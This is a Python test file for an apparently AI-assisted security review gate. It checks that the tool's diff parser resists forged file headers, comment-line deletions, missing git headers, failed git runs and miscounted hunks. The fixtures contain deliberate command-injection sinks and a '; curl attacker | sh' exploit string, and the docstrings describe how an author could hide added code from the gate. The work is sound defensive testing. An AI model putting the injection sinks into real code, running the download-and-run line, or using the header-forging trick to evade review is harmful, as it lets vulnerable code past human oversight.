"""Half of a diff is text an author wrote, and the parser read all of it.

`changed_lines` decided which lines a change is answerable for by scanning for
lines that *look like* diff headers. Inside a hunk, what a line looks like is
the author's choice: a file that adds

    ++ b/src/decoy.py

is emitted by git as `+++ b/src/decoy.py`, which the parser read as "a new file
starts here". Every addition after it — including the rest of that same hunk and
every later hunk of the same file — was recorded against a file that does not
exist. The file actually being changed lost them, so a finding on the code the
author added is attributed to neither the additions nor the deletions, which is
how a weakness that was *already there* is recorded, and pre-existing findings do
not block.

The same reading dropped deletions: a removed line beginning `-- ` arrives as
`--- ...` and was skipped as an old-file header. `--` opens a comment in SQL,
Lua, Haskell and Ada, so that one needed no attacker at all.

The fix is structural. Every line of a hunk body carries a marker column, so
column zero belongs to the diff and `+++ `/`--- ` are read only outside a hunk
body — where an author's text cannot reach.
"""

from __future__ import annotations

import subprocess

import pytest

from security_agent.config import Config, GitLabContext
from security_agent.evidence import DiffFormatError, attribution, changed_lines
from security_agent.gate import EXIT_FINDINGS, decide
from security_agent.models import ScanOutcome
from security_agent.tools import REPORT_FINDING, Session, dispatch
from security_agent.workspace import Workspace, WorkspaceError

SINK = "return subprocess.run(user_input, shell=True)"

# The added block. Everything between the forged header and the sink exists to
# put the sink out of `ADDITION_SLACK`'s reach of the one addition the old
# parser still credited to this file — otherwise the attribution survives the
# bug by accident and the test proves nothing.
BEFORE = '''\
import subprocess


def handler(user_input):
    return None
'''

AFTER = '''\
import subprocess

HELP = """
++ b/src/decoy.py
usage: app [options]

  -v   verbose
  -q   quiet
  -h   this text
"""


def handler(user_input):
    {}
'''.format(SINK)


def _git(root, *args):
    subprocess.run(("git", "-C", str(root), *args), check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path):
    """A change that adds a forged file header and a command injection below it."""
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    subprocess.run(("git", "init", "-q", str(root)), check=True, capture_output=True)
    _git(root, "config", "user.email", "t@example.com")
    _git(root, "config", "user.name", "T")
    (root / "src" / "app.py").write_text(BEFORE, encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "base")
    base = subprocess.run(
        ("git", "-C", str(root), "rev-parse", "HEAD"),
        capture_output=True, text=True, check=True).stdout.strip()
    (root / "src" / "app.py").write_text(AFTER, encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "change")
    return Workspace(root=root, diff_base=base, diff_head="HEAD")


def _sink_line() -> int:
    return AFTER.splitlines().index("    " + SINK) + 1


class TestForgedFileHeader:
    def test_no_file_appears_that_the_change_never_touched(self, repo):
        """The forged name must not become a key. It is a file the repository
        does not contain, and every line credited to it is a line taken away
        from the file that really changed."""
        assert "src/decoy.py" not in repo.changed_line_map().files()

    def test_the_added_sink_belongs_to_the_change(self, repo):
        """The step that decided the gate. `""` means "already there", and a
        pre-existing finding does not block by default — so an author could
        exempt their own added code by writing two characters at the start of a
        line."""
        where = attribution("src/app.py", _sink_line(), 1, repo.changed_line_map())

        assert where == "added"

    def test_the_whole_chain_still_blocks_the_merge(self, repo):
        """Git to exit code, through the tool the model actually calls.

        The intermediate assertions above all passed at some point on code that
        let this through: the defect lives between them, in which file the
        additions were filed under.
        """
        session = Session()
        result = dispatch(repo, session, REPORT_FINDING, {
            "title": "Command injection in handler",
            "severity": "high", "confidence": "high", "category": "injection",
            "file": "src/app.py", "line": _sink_line(), "evidence": SINK,
            "description": "User input is passed to a shell.",
            "exploit_scenario": "A caller sends `; curl attacker | sh`.",
            "recommendation": "Pass an argument list and do not use a shell.",
        })
        assert not result.is_error
        candidate = session.candidates[0]
        assert candidate.in_changed_lines, "the added sink was filed as pre-existing"

        outcome = ScanOutcome(mode="diff")
        outcome.reported = [candidate]

        decision = decide(Config(gitlab=GitLabContext()), outcome)

        assert decision.exit_code == EXIT_FINDINGS

    def test_a_later_hunk_of_the_same_file_is_not_lost_either(self, repo):
        """The forged header outlived the hunk it sat in: `current` stayed
        pointed at the invented file until the next real header, so a change
        with a second hunk lost that one too."""
        added = repo.changed_line_map().added["src/app.py"]

        # The injected block near the top, and the sink far below it.
        assert min(added) < 6 and max(added) == _sink_line()


class TestDeletionsThatLookLikeHeaders:
    """`-- ` at the start of a removed line is a comment in SQL, Lua, Haskell
    and Ada — and was read as an old-file header and dropped. The removal map is
    what the removed-control rule reads, so a deletion missing from it is a
    guard that was never seen to be taken away."""

    def test_a_removed_sql_comment_line_is_recorded(self):
        """Two removals in one change, one of which looked like a header.

        Written as two hunks on purpose: a `-- ` line deleted *beside* an
        ordinary one anchors to the same place, so losing it changes no answer
        and proves nothing. These sit apart, and only one of them survived.
        """
        diff = (
            "diff --git a/db/policy.sql b/db/policy.sql\n"
            "--- a/db/policy.sql\n"
            "+++ b/db/policy.sql\n"
            "@@ -4,1 +4,0 @@ CREATE POLICY tenant_isolation\n"
            # The file's own line is `-- +migrate StatementBegin`; the diff's
            # marker column makes it three dashes.
            "--- +migrate StatementBegin\n"
            "@@ -20,1 +19,0 @@ COMMIT;\n"
            "-ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;\n"
        )

        assert changed_lines(diff).removed_at["db/policy.sql"] == {4, 19}

    def test_a_removed_comment_is_the_only_deletion_and_still_attributes(self):
        """The case where losing it changes the answer: nothing else in the
        hunk is deleted, so the map is empty and the code below the removal
        comes out pre-existing."""
        diff = (
            "diff --git a/policy.lua b/policy.lua\n"
            "--- a/policy.lua\n"
            "+++ b/policy.lua\n"
            "@@ -9,1 +9,0 @@ local function proxy(req)\n"
            # The file's line is `-- verify_signature(req) -- do not remove`.
            "--- verify_signature(req) -- do not remove\n"
        )
        changed = changed_lines(diff)

        assert changed.removed_at["policy.lua"] == {9}
        assert attribution("policy.lua", 11, 1, changed) == "deleted"

    def test_a_real_old_file_header_is_still_not_a_deletion(self):
        """The control. Outside a hunk, `--- a/x` is what it says it is, and
        counting it would put a phantom deletion at the top of every file."""
        diff = ("diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n"
                "@@ -1,1 +1,1 @@\n-old\n+new_value_here\n")
        changed = changed_lines(diff)

        assert changed.removed_at["x.py"] == {1}
        assert changed.added["x.py"] == {1}


class TestADiffWithNoGitHeaderLine:
    """`diff ` was the only thing that ended a hunk, and not every diff has one.

    The parser closed a hunk on a line beginning `diff `, which `git diff`
    always writes and `diff -ruN` — and most patch tools — never do. Every file
    after the first was then read as more body of file one: its `+++ ` header
    counted as an addition to the wrong file, its content was filed under the
    wrong name, and a finding in it came out with no attribution at all, which
    is recorded as pre-existing and does not block under the default
    `gate_pre_existing=False`.

    Not reachable through `workspace.changed_line_map`, which shells out to git
    itself — checked before this was written, and the reason it is filed as a
    parser defect rather than a live hole. Fixed because the function is
    documented as reading a unified diff and fails silently on one, and because
    the next caller will not know to ask.

    A hunk now ends where its own header says it ends.
    """

    PLAIN = (
        "--- a/one.py\n"
        "+++ b/one.py\n"
        "@@ -1,2 +1,3 @@\n"
        " x = 1\n"
        "+import os\n"
        " y = 2\n"
        "--- a/two.py\n"
        "+++ b/two.py\n"
        "@@ -10,2 +10,3 @@\n"
        " a = 1\n"
        "+os.system(cmd)\n"
        " b = 2\n"
    )

    def test_the_second_file_is_its_own_file(self):
        """It used to be absent entirely: `two.py` never became a key, so
        `attribution` answered "" for every line of it."""
        changed = changed_lines(self.PLAIN)

        assert changed.files() == {"one.py", "two.py"}
        assert changed.added["one.py"] == {2}
        assert changed.added["two.py"] == {11}

    def test_the_added_sink_in_the_second_file_is_attributed(self):
        """The step that reaches the gate. Before the fix this was "", which
        the gate reads as a weakness that was already there."""
        changed = changed_lines(self.PLAIN)

        assert attribution("two.py", 11, 1, changed) == "added"

    def test_the_first_file_is_not_credited_with_the_second_s_lines(self):
        """The other half of the same error. `+++ b/two.py` begins with `+`,
        so it was counted as an addition to `one.py` — at a line number nothing
        in that file corresponds to, with every later number shifted by one."""
        assert changed_lines(self.PLAIN).added["one.py"] == {2}

    def test_a_forged_header_inside_a_hunk_is_still_content(self):
        """The control, and the thing that must not be traded away for the
        above. Git writes a hunk's line counts from the body it emits, so a
        `+++ ` line an author added is inside the count and the hunk does not
        end early. Had ending a hunk on its declared length reopened this, the
        decoy at the top of this file would work again."""
        diff = (
            "diff --git a/app.py b/app.py\n"
            "--- a/app.py\n"
            "+++ b/app.py\n"
            "@@ -1,1 +1,4 @@\n"
            " keep\n"
            "+++ b/attacker/choice.py\n"
            "+import subprocess\n"
            "+subprocess.run(cmd, shell=True)\n"
        )
        changed = changed_lines(diff)

        assert "attacker/choice.py" not in changed.files()
        assert changed.added["app.py"] == {2, 3, 4}

    def test_a_deleted_file_does_not_swallow_the_one_after_it(self):
        """`+++ /dev/null` leaves `current` unset, and the body still has to be
        walked past. Counting only where a file is named would have left the
        hunk open and eaten the next file in a diff with no `diff ` line."""
        diff = (
            "--- a/gone.py\n"
            "+++ /dev/null\n"
            "@@ -1,2 +0,0 @@\n"
            "-x = 1\n"
            "-y = 2\n"
            "--- a/kept.py\n"
            "+++ b/kept.py\n"
            "@@ -5,1 +5,2 @@\n"
            " a = 1\n"
            "+os.system(cmd)\n"
        )
        changed = changed_lines(diff)

        assert changed.added["kept.py"] == {6}
        assert "gone.py" not in changed.files()


class TestAGitDiffThatFailedIsNotAnEmptyChange:
    """`changed_line_map` asked git with `check=False`, and `git()` returns
    whatever the process managed to write whatever its exit code.

    So a `git diff` that was refused — a bad revision, a corrupt object, a
    killed process — handed back a *structurally valid* map of however much it
    got out, and the hunk accounting cannot see it: output stopping cleanly
    between two files is well-formed. Every file git never reached is then
    absent, findings there are attributed to nothing, and an unattributed
    finding is reported as pre-existing, which does not block by default.

    "Could not read the change" and "the change is clean" are different
    answers. They have different exit codes and this is where they parted.
    """

    def test_a_refused_diff_stops_the_review(self, repo):
        broken = Workspace(root=repo.root, diff_base="0" * 40,
                           diff_head="HEAD")

        with pytest.raises(WorkspaceError) as caught:
            broken.changed_line_map()

        assert "git diff" in str(caught.value)

    def test_a_diff_git_answers_is_still_read(self, repo):
        """The control: the refusal must not cost the ordinary case."""
        assert repo.changed_line_map().added["src/app.py"]


class TestCountsThatDoNotAddUpAreRefused:
    """Counting the hunk body made the forgery defence depend on the counts
    being honest, and nothing checked them.

    The old rule closed a hunk on the next `diff ` line, so a `+++ b/decoy.py`
    written *inside* a hunk was never read as a header, whatever the header
    said. Counting restored the general unified-diff case and moved the
    guarantee onto the numbers: a header claiming fewer lines than its body has
    closes the hunk early, and the surplus body — attacker text — is then read
    as structure. A `+++ b/decoy.py` in it names the next hunk's additions
    after a file the author chose, and every finding in the real file comes
    back unattributed, which does not block.

    Refused rather than parsed as far as it goes: a partial map looks exactly
    like a complete one to `attribution`, and `git diff` emits neither shape,
    so nothing this tool actually reads can trip it.
    """

    def test_a_header_that_undercounts_its_body_is_refused(self):
        diff = (
            "--- a/one.py\n"
            "+++ b/one.py\n"
            "@@ -1,1 +1,1 @@\n"
            " kept\n"
            "+surplus\n"
            "+++ b/decoy.py\n"
            "@@ -1,0 +1,1 @@\n"
            "+evil()\n"
        )

        with pytest.raises(DiffFormatError) as caught:
            changed_lines(diff)

        assert "fewer lines than it has" in str(caught.value)

    def test_one_side_overrunning_its_own_count_is_refused(self):
        """Each side is checked on its own. Closing the hunk only when *both*
        counters reached zero let one go negative and be paid for by the other,
        so `-0,0 +0,1` accepted a deletion followed by an addition — a hunk no
        producer can write, and the promise this parser makes is about each
        side, not about the sum."""
        diff = (
            "--- a/one.py\n"
            "+++ b/one.py\n"
            "@@ -0,0 +0,1 @@\n"
            "-gone\n"
            "+new\n"
        )

        with pytest.raises(DiffFormatError) as caught:
            changed_lines(diff)

        assert "more lines on one side" in str(caught.value)

    def test_a_diff_that_ends_inside_a_hunk_is_refused(self):
        """Truncation is how a diff arrives when something cut it — a ceiling,
        a broken pipe. Returning what was read hands the caller a map that
        looks complete, and this is the tool that must not call a half-read
        change a clean one."""
        diff = (
            "--- a/one.py\n"
            "+++ b/one.py\n"
            "@@ -1,4 +1,4 @@\n"
            " a\n"
        )

        with pytest.raises(DiffFormatError) as caught:
            changed_lines(diff)

        assert "owed 3 old and 3 new" in str(caught.value)

    def test_every_diff_git_writes_is_still_accepted(self):
        """The control, and the one that decides whether this rule may ship: a
        refusal on a real diff aborts a review that would otherwise have run.
        Sixty commits of this repository, at the context width the reviewer
        asks for."""
        revisions = subprocess.run(
            ["git", "log", "--format=%H", "-60"],
            capture_output=True, text=True, check=True).stdout.split()
        read = 0
        for revision in revisions:
            text = subprocess.run(
                ["git", "show", "--format=", "--unified=12", revision],
                capture_output=True, text=True, check=True).stdout
            if not text.strip():
                continue
            changed_lines(text)
            read += 1

        assert read > 40
